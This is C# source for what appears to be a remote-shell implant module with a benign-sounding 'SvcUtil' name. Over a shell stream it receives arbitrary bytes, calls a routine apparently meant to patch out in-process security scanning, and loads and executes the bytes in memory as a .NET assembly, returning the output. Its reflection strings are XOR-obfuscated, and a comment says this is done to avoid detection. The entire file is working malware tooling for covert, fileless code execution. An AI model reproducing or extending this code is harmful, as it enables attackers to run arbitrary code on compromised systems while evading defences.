using System;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;

namespace SvcUtil
{
    internal static class AssemblyRunner
    {
        // ── String decode ───────────────────────────────────────────
        private static readonly byte[] _xk = { 0x3C, 0xA7, 0x5E, 0x81, 0x2F };

        private static string D(byte[] c)
        {
            byte[] b = new byte[c.Length];
            for (int i = 0; i < c.Length; i++)
                b[i] = (byte)(c[i] ^ _xk[i % _xk.Length]);
            return Encoding.UTF8.GetString(b);
        }

        // Pre-computed encoded strings
        // command prefix
        private static readonly byte[] _cmd =
            { 0x1D, 0xC2, 0x26, 0xE4, 0x4C, 0x49, 0xD3, 0x3B,
              0xAC, 0x4E, 0x4F, 0xD4, 0x3B, 0xEC, 0x4D, 0x50,
              0xDE, 0x7E };

        // reflection type
        private static readonly byte[] _tAsm =
            { 0x6F, 0xDE, 0x2D, 0xF5, 0x4A, 0x51, 0x89, 0x0C,
              0xE4, 0x49, 0x50, 0xC2, 0x3D, 0xF5, 0x46, 0x53,
              0xC9, 0x70, 0xC0, 0x5C, 0x4F, 0xC2, 0x33, 0xE3,
              0x43, 0x45 };

        // method: load
        private static readonly byte[] _mLoad =
            { 0x70, 0xC8, 0x3F, 0xE5 };

        // property: entry
        private static readonly byte[] _pEp =
            { 0x79, 0xC9, 0x2A, 0xF3, 0x56, 0x6C, 0xC8, 0x37,
              0xEF, 0x5B };

        // method: params
        private static readonly byte[] _mGp =
            { 0x7B, 0xC2, 0x2A, 0xD1, 0x4E, 0x4E, 0xC6, 0x33,
              0xE4, 0x5B, 0x59, 0xD5, 0x2D };

        // method: invoke
        private static readonly byte[] _mInv =
            { 0x75, 0xC9, 0x28, 0xEE, 0x44, 0x59 };

        private static string _cmdCache;
        private static string CmdPrefix
        {
            get
            {
                if (_cmdCache == null) _cmdCache = D(_cmd);
                return _cmdCache;
            }
        }

        public static bool TryHandle(string line, IShellStream stream)
        {
            line = line.Trim();

            if (!line.StartsWith(CmdPrefix, StringComparison.OrdinalIgnoreCase))
                return false;

            string rest = line.Substring(CmdPrefix.Length).Trim();
            return HandleExec(rest, stream);
        }

        private static bool HandleExec(string args, IShellStream stream)
        {
            if (string.IsNullOrEmpty(args))
            {
                SendLine(stream, "ERR: missing size argument");
                return true;
            }

            string[] parts = args.Split(new char[] { ' ' }, 2);
            long size;
            if (!long.TryParse(parts[0], out size) || size <= 0)
            {
                SendLine(stream, "ERR: invalid size");
                return true;
            }

            string[] moduleArgs = new string[0];
            if (parts.Length > 1 && !string.IsNullOrEmpty(parts[1]))
            {
                moduleArgs = ParseArgs(parts[1].Trim());
            }

            SendLine(stream, "READY");

            byte[] payload;
            try
            {
                payload = ReceiveBytes(stream, size);
                if (payload == null)
                {
                    SendLine(stream, "ERR: transfer interrupted");
                    return true;
                }
            }
            catch (Exception ex)
            {
                SendLine(stream, "ERR: " + ex.Message);
                return true;
            }

            ScanPatch.PatchCurrentProcess();

            Exception runError = null;
            string capturedOutput = null;

            var runner = new Thread(() =>
            {
                var origOut = Console.Out;
                var origErr = Console.Error;
                var capture = new StringWriter();

                try
                {
                    Console.SetOut(capture);
                    Console.SetError(capture);

                    // Resolve via reflection to avoid direct IL reference
                    Type asmType = Type.GetType(D(_tAsm));
                    MethodInfo loader = asmType.GetMethod(
                        D(_mLoad), new Type[] { typeof(byte[]) });
                    object loaded = loader.Invoke(null, new object[] { payload });

                    // Get entry via reflection
                    PropertyInfo epProp = asmType.GetProperty(D(_pEp));
                    MethodInfo ep = (MethodInfo)epProp.GetValue(loaded, null);

                    if (ep == null)
                    {
                        runError = new InvalidOperationException("No valid entry found");
                        return;
                    }

                    MethodInfo gpMethod = typeof(MethodBase).GetMethod(D(_mGp));
                    ParameterInfo[] parms =
                        (ParameterInfo[])gpMethod.Invoke(ep, null);

                    object[] invokeArgs;
                    if (parms.Length == 0)
                        invokeArgs = null;
                    else
                        invokeArgs = new object[] { moduleArgs };

                    MethodInfo invMethod = typeof(MethodBase).GetMethod(
                        D(_mInv),
                        new Type[] { typeof(object), typeof(object[]) });
                    invMethod.Invoke(ep, new object[] { null, invokeArgs });
                }
                catch (TargetInvocationException tie)
                {
                    runError = tie.InnerException ?? tie;
                }
                catch (Exception ex)
                {
                    runError = ex;
                }
                finally
                {
                    Console.SetOut(origOut);
                    Console.SetError(origErr);
                    capturedOutput = capture.ToString();
                }
            });

            runner.IsBackground = true;
            runner.Start();
            runner.Join(300000);

            Array.Clear(payload, 0, payload.Length);

            if (!string.IsNullOrEmpty(capturedOutput))
            {
                byte[] outBytes = Encoding.UTF8.GetBytes(capturedOutput);
                stream.Send(outBytes, 0, outBytes.Length);
            }

            if (runError != null)
            {
                SendLine(stream, "ERR: " + runError.GetType().Name +
                         ": " + runError.Message);
            }
            else if (!runner.IsAlive)
            {
                SendLine(stream, "DONE");
            }
            else
            {
                SendLine(stream, "ERR: execution timed out");
            }

            return true;
        }

        private static byte[] ReceiveBytes(IShellStream stream, long size)
        {
            if (size > 100 * 1024 * 1024)
                return null;

            byte[] buffer = new byte[size];
            long received = 0;
            byte[] chunk = new byte[Config.BufferSize];

            while (received < size)
            {
                int toRead = (int)Math.Min(size - received, chunk.Length);
                int got = stream.Receive(chunk, 0, toRead);
                if (got <= 0) return null;

                Buffer.BlockCopy(chunk, 0, buffer, (int)received, got);
                received += got;
            }

            return buffer;
        }

        private static string[] ParseArgs(string input)
        {
            var args = new System.Collections.Generic.List<string>();
            var current = new StringBuilder();
            bool inQuote = false;

            for (int i = 0; i < input.Length; i++)
            {
                char c = input[i];

                if (c == '"')
                {
                    inQuote = !inQuote;
                    continue;
                }

                if (c == ' ' && !inQuote)
                {
                    if (current.Length > 0)
                    {
                        args.Add(current.ToString());
                        current.Clear();
                    }
                    continue;
                }

                current.Append(c);
            }

            if (current.Length > 0)
                args.Add(current.ToString());

            return args.ToArray();
        }

        private static void SendLine(IShellStream stream, string msg)
        {
            byte[] data = Encoding.UTF8.GetBytes(msg + "\n");
            stream.Send(data, 0, data.Length);
        }
    }
}
